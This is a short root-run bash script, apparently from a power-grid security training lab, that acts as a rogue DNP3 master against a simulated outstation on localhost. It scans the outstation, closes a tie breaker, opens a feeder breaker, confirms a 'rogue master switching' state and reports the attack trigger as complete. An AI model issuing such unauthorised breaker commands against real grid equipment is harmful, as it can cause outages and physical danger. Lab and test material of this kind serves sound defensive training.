#!/usr/bin/env bash
set -Eeuo pipefail
IFS=$'\n\t'
[[ ${EUID} -eq 0 ]] || { echo "Run as root: sudo $0" >&2; exit 1; }
DNP3=/opt/prabal-urja/scenario3/bin/prabal-dnp3-command
[[ -x "$DNP3" ]] || { echo "Scenario 03 DNP3 client is missing" >&2; exit 1; }
timeout 20 "$DNP3" --host 127.0.0.1 --port 20001 --master 77 --outstation 10 --action scan >/tmp/prabal-s03-operator-scan.log
timeout 20 "$DNP3" --host 127.0.0.1 --port 20001 --master 77 --outstation 10 --action close --point 1 >/tmp/prabal-s03-operator-close-tie.log
sleep 5
timeout 20 "$DNP3" --host 127.0.0.1 --port 20001 --master 77 --outstation 10 --action open --point 0 >/tmp/prabal-s03-operator-open-feeder-a.log
sleep 6
jq -e '.scenario_state=="ROGUE_MASTER_SWITCHING_CONFIRMED"' /var/lib/prabal-urja/scenario3/state.json >/dev/null
echo "OPERATOR_ATTACK_TRIGGER:COMPLETE"
